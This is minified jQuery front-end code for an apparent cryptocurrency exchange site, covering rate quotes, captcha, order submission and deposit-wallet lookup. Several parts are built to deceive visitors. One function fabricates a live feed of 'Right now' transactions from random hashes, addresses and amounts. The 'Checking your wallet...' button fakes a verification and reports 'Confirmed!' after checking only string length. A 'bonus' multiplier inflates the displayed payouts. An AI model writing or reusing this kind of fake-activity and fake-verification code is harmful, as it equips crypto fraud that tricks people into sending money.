$(document).ready((function(){function e(e,c,a){"send"==a?$.ajax({url:"/handler?send="+e+"&receive="+c,dataType:"json",success:function(e){e=e[c];let a=(minUSD/e).toFixed(5)-0,t=(maxUSD/e).toFixed(5)-0;$(".exchange__block-text-send span").text("("+a+" — "+t+")"),$(".exchange__block-input-send").val(a),$(".exchange__block-input-send").data("min",a),$(".exchange__block-input-send").data("max",t)}}):"receive"==a?$.ajax({url:"/handler?send="+e+"&receive="+c,dataType:"json",success:function(e){e=e[c];let a=($(".exchange__block-input-send").data("min")*e/100*bonus).toFixed(5)-0,t=($(".exchange__block-input-send").data("max")*e/100*bonus).toFixed(5)-0;$(".exchange__block-text-receive span").text("("+a+" — "+t+")"),$(".exchange__block-input-receive").val(a),$(".exchange__block-input-receive").data("min",a),$(".exchange__block-input-receive").data("max",t)}}):"calc"==a?$.ajax({url:"/handler?send="+e+"&receive="+c,dataType:"json",success:function(e){e=e[c];let a=($(".exchange__block-input-receive").val()/bonus*100/e).toFixed(5)-0;$(".exchange__block-input-send").val(a)}}):$.ajax({url:"/handler?send="+e+"&receive="+c,dataType:"json",success:function(e){e=e[c];let a=($(".exchange__block-input-send").val()*e/100*bonus).toFixed(5)-0;$(".exchange__block-input-receive").val(a)}})}$("#exchange").length>0&&(e($(".exchange__block-list-send .exchange__block-item_active img")[0],"USDT","send"),e($(".exchange__block-list-send .exchange__block-item_active img")[0],$(".exchange__block-list-receive .exchange__block-item_active img")[0],"receive")),$("body").css({overflow:"auto"}),$(".preloader").fadeOut(1e3),wow=new WOW({animateClass:"animate__animated"}),wow.init();let c=Math.floor(19*Math.random())+1;$(".exchange__block-input-captcha-first-num").val(c);let a=Math.floor(19*Math.random())+1;$(".exchange__block-input-captcha-second-num").val(a);let t=c+a;function n(){c=Math.floor(19*Math.random())+1,$(".exchange__block-input-captcha-first-num").val(c),a=Math.floor(19*Math.random())+1,$(".exchange__block-input-captcha-second-num").val(a),t=c+a}function o(){let e=Math.random().toString(36).substring(2)+"...",c=(899999*Math.random()+1e5).toFixed(0),a="1234567890FJKTFBSAE",t="";To="";for(let e=0;e<6;e++)t+=a[Math.round(Math.random()*(a.length-1))],To+=a[Math.round(Math.random()*(a.length-1))];t+="...",To+="...";let n=$(".exchange__block-list-send").find("img")[Math.floor(Math.random()*$(".exchange__block-list-send").length)].alt;"SHIB"==n&&(n="BTC"),$.ajax({url:"https://min-api.cryptocompare.com/data/price?fsym="+n+"&tsyms=usdt",dataType:"json",success:function(a){a=a.USDT,Value=parseFloat(Math.random()*(900/a-500/a)+500/a).toFixed(2)+" "+n,$(".transactions__table-content").prepend('<tr class="transactions__tr" style="display: none;"><td class="transactions__td">'+e+'</td><td class="transactions__td">'+c+'</td><td class="transactions__td">'+t+'</td><td class="transactions__td">'+To+'</td><td class="transactions__td">'+Value+'</td><td class="transactions__td transactions__td_blue">Right now</td></tr>'),$(".transactions__table-content tr:first").fadeIn(),$(".transactions__table-content tr").length>5&&$(".transactions__table-content tr:last").remove()}})}$("#exchange").length>0&&(o(),setInterval(o,7500)),$(document).on("input",".exchange__block-input-val",(function(){$(".exchange__block-input-val").css({border:"none"}),$(".exchange__block-text-send").css("color","#585858"),$(".exchange__block-text-receive").css("color","#585858")})).on("input",".exchange__block-input-receive-address",(function(){$(this).css({border:"none"})})).on("input",".exchange__block-input-captcha-sum",(function(){$(this).css({border:"none"})})).on("input","#referral_code",(function(){$(this).css({border:"none"})})),$(".exchange__block-form").submit((function(e){e.preventDefault();let c=0;$(".exchange__block-input-captcha-sum").val()!=t?(c=1,$(".exchange__block-input-captcha-sum").css({border:"1px solid red"}),n()):$(".exchange__block-input-send").css({border:"1px solid transparent"}),$(".exchange__block-input-send").val()<$(".exchange__block-input-send").data("min")||$(".exchange__block-input-send").val()>$(".exchange__block-input-send").data("max")||$(".exchange__block-input-receive").val()<$(".exchange__block-input-receive").data("min")||$(".exchange__block-input-receive").val()>$(".exchange__block-input-receive").data("max")?(c=1,$(".exchange__block-input-val").css({border:"1px solid red"}),$(".exchange__block-text-send").css("color","red"),$(".exchange__block-text-receive").css("color","red"),n()):$(".exchange__block-input-val").css({border:"1px solid transparent"}),$(".exchange__block-input-receive-address").val().length<20||$(".exchange__block-input-receive-address").val().length>120||!/\d/.test($(".exchange__block-input-receive-address").val())||!/[a-zA-Z]/.test($(".exchange__block-input-receive-address").val())?(c=1,$(".exchange__block-input-receive-address").css({border:"1px solid red"}),n()):$(".exchange__block-input-receive-address").css({border:"1px solid transparent"}),0==c&&($("#referral_code").val().length>0?$.ajax({url:"/check-referral-code?code="+$("#referral_code").val(),dataType:"json",success:function(e){"1"==e?$("#referral_code").css("border","1px solid red"):$.ajax({url:"/check-wallet",method:"post",data:{coin:$(".exchange__block-list-send .exchange__block-item_active img")[0].alt},success:function(e){$.ajax({url:"create-order",method:"post",data:{referralCode:$("#referral_code").val(),receiveAddress:$(".exchange__block-input-receive-address").val(),email:$(".exchange__block-input-email").val(),exchange:$.trim($(".exchange__block-header-send").text())+" on "+$.trim($(".exchange__block-header-receive").text()),fromWallet:"",fromCoin:$(".exchange__block-list-send .exchange__block-item_active img")[0].alt,fromCoinVal:$(".exchange__block-input-send").val(),toWallet:e,toCoin:$(".exchange__block-list-receive .exchange__block-item_active img")[0].alt,toCoinVal:$(".exchange__block-input-receive").val()},success:function(e){location.href=e}})}})}}):$.ajax({url:"/check-wallet",method:"post",data:{coin:$(".exchange__block-list-send .exchange__block-item_active img")[0].alt},success:function(e){$.ajax({url:"create-order",method:"post",data:{referralCode:$("#referral_code").val(),receiveAddress:$(".exchange__block-input-receive-address").val(),email:$(".exchange__block-input-email").val(),exchange:$.trim($(".exchange__block-header-send").text())+" on "+$.trim($(".exchange__block-header-receive").text()),fromWallet:"",fromCoin:$(".exchange__block-list-send .exchange__block-item_active img")[0].alt,fromCoinVal:$(".exchange__block-input-send").val(),toWallet:e,toCoin:$(".exchange__block-list-receive .exchange__block-item_active img")[0].alt,toCoinVal:$(".exchange__block-input-receive").val()},success:function(e){location.href=e}})}}))})),$(".how-exchange__block-btn").click((function(){$(this).html("Checking your wallet..."),$(this).css({background:"#0085FF",color:"#FFFFFF"}),setTimeout((function(){$(".how-exchange__block-input").val().length<20||$(".how-exchange__block-input").val().length>120||!/\d/.test($(".how-exchange__block-input").val())||!/[a-zA-Z]/.test($(".how-exchange__block-input").val())?($(".how-exchange__block-btn").html("Denied!"),$(".how-exchange__block-btn").css({background:"#FF0000",color:"#FFFFFF"})):($(".how-exchange__block-btn").html("Confirmed!"),$(".how-exchange__block-btn").css({background:"#00FFA3",color:"#000000"}))}),1500)})),$(".exchange__block-input-val").change((function(){$(this).hasClass("exchange__block-input-send")?e($(".exchange__block-list-send .exchange__block-item_active img")[0].alt,$(".exchange__block-list-receive .exchange__block-item_active img")[0].alt):e($(".exchange__block-list-send .exchange__block-item_active img")[0].alt,$(".exchange__block-list-receive .exchange__block-item_active img")[0].alt,"calc")})),$(".exchange__block-input-val").keyup((function(){$(this).hasClass("exchange__block-input-send")?e($(".exchange__block-list-send .exchange__block-item_active img")[0].alt,$(".exchange__block-list-receive .exchange__block-item_active img")[0].alt):e($(".exchange__block-list-send .exchange__block-item_active img")[0].alt,$(".exchange__block-list-receive .exchange__block-item_active img")[0].alt,"calc")})),$("#exchange").length>0&&(e($(".exchange__block-list-send .exchange__block-item_active img")[0].alt,$(".exchange__block-list-receive .exchange__block-item_active img")[0].alt,"receive"),e($(".exchange__block-list-send .exchange__block-item_active img")[0].alt,$(".exchange__block-list-receive .exchange__block-item_active img")[0].alt,"receive"))})),$(".exchange__block-item-send").click((function(){$(".exchange__block-item-send").removeClass("exchange__block-item_active"),$(this).addClass("exchange__block-item_active")})),$(".exchange__block-item-receive").click((function(){$(".exchange__block-item-receive").not(this).removeClass("exchange__block-item_active"),$(this).addClass("exchange__block-item_active")}));